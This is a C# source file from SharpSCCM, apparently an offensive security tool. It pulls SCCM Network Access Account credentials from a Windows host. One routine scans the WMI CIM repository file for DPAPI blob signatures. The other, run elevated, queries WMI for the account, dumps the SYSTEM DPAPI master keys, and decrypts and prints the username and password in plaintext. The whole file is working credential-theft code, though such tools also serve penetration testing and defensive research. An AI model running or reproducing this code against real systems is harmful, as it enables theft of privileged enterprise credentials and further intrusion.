﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Management;

namespace SharpSCCM
{
    public class Credentials
    {

        public static void LocalNetworkAccessAccountsDisk()
        {
            Console.WriteLine($"[*] Retrieving Network Access Account blobs from CIM repository");

            // Path of the CIM repository
            string cimRepoPath = "C:\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";

            // We don't have to be elevated to read the blobs...
            // get size of file
            FileInfo cimRepo = new FileInfo(cimRepoPath);
            uint bytesToSearch = (uint) (int) cimRepo.Length;

            if (FileContainsDpapiBlob(cimRepoPath, bytesToSearch))
            {
                Console.WriteLine($"[*]     Found potential DPAPI blob at {cimRepoPath}\n");
            }
            else
            {
                Console.WriteLine($"[!]     No DPAPI blob found");
            }

            // Parse from CIM repo
            //string protectedUsername = "";
            //string protectedPassword = "";

            // TODO -- Logic to strip blob
            // But we do have to be elevated to retrieve the system masterkeys...
            if (Helpers.IsHighIntegrity())
            {
                Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();
                Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
                foreach (KeyValuePair<string, string> kvp in mappings)
                {
                    Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                }
                Console.WriteLine();

                //try
                //{
                //    string username = Dpapi.Execute(protectedUsername, mappings);
                //    string password = Dpapi.Execute(protectedPassword, mappings);

                //    Console.WriteLine("\r\n[*] Triaging Network Access Account Credentials\r\n");
                //    Console.WriteLine("     Plaintext NAA Username         : {0}", username);
                //    Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
                //}
                //catch (Exception e)
                //{
                //    Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                //    Console.WriteLine(e.ToString());
                //}
            }
        }

        private static readonly byte[] dpapiBlobHeader =
{
            // Version(4 bytes) | DPAPI Proivder Guid(16-bytes - df9d8cd0-1501-11d1-8c7a-00c04fc297eb)
            0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB
        };

        private static readonly byte[][] dpapiBlobSearches =
        {
            dpapiBlobHeader,

            // The following are potential base64 representations of the DPAPI provider GUID
            // Generated by putting dpapiProviderGuid into the script here: https://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/
            System.Text.Encoding.ASCII.GetBytes("AAAA0Iyd3wEV0RGMegDAT8KX6"),
            System.Text.Encoding.ASCII.GetBytes("AQAAANCMnd8BFdERjHoAwE/Cl+"),
            System.Text.Encoding.ASCII.GetBytes("EAAADQjJ3fARXREYx6AMBPwpfr"),

            // Hex string representation
            System.Text.Encoding.ASCII.GetBytes("01000000D08C9DDF0115D1118C7A00C04FC297EB")
        };

        private static bool FileContainsDpapiBlob(string path, uint bytesToSearch)
        {
            // Does the file contain a DPAPI blob?
            var fileContents = new byte[bytesToSearch];
            using (var file = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                file.Read(fileContents, 0, (int)bytesToSearch);
            }

            return ContainsDpapiBlob(fileContents);
        }

        private static bool ContainsDpapiBlob(byte[] bytes)
        {
            // return bytes.Contains(dpapiProviderGuid);
            foreach (var searchBytes in dpapiBlobSearches)
            {
                if (bytes.Contains(searchBytes))
                    return true;
            }

            return false;
        }

        public static void LocalNetworkAccessAccountsWmi()
        {
            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine($"[*] Retrieving Network Access Account blobs via WMI\n");
                ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("localhost","root\\ccm\\policy\\Machine\\ActualConfig");
                //MgmtUtil.GetClassInstances(wmiConnection, "CCM_NetworkAccessAccount");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
                ManagementObjectCollection accounts = searcher.Get();
                if (accounts.Count > 0)
                {
                    foreach (ManagementObject account in accounts)
                    {
                        string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                        string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
                        byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                        int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                        Array.Resize(ref protectedUsernameBytes, length);


                        Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();

                        Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
                        foreach (KeyValuePair<string, string> kvp in mappings)
                        {
                            Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                        }
                        Console.WriteLine();

                        try
                        {
                            string username = Dpapi.Execute(protectedUsername, mappings);
                            string password = Dpapi.Execute(protectedPassword, mappings);

                            Console.WriteLine("\r\n[*] Triaging Network Access Account Credentials\r\n");
                            Console.WriteLine("     Plaintext NAA Username         : {0}", username);
                            Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                            Console.WriteLine(e.ToString());
                        }
                    }
                }
                else
                {
                    Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount.\n");
                    Console.WriteLine($"[+] \n");
                    Console.WriteLine($"[+] This could mean one of three things:\n");
                    Console.WriteLine($"[+]    1. The SCCM environment does not have a Network Access Account configured\n");
                    Console.WriteLine($"[+]    2. This host is not an SCCM client (and never has been)\n");
                    Console.WriteLine($"[+]    3. This host is no longer an SCCM client (but used to be)\n");
                    Console.WriteLine($"[+] You can attempt running 'SharpSCCM local naa disk' to retrieve NAA credentials from machines\n");
                    Console.WriteLine($"[+] that used to be SCCM clients but have since had the client uninstalled.");
                }
            }
            else
            {
                Console.WriteLine("[!] SharpSCCM must be run elevated to retrieve the NAA blobs via WMI.\n");
            }
        }
    }
}
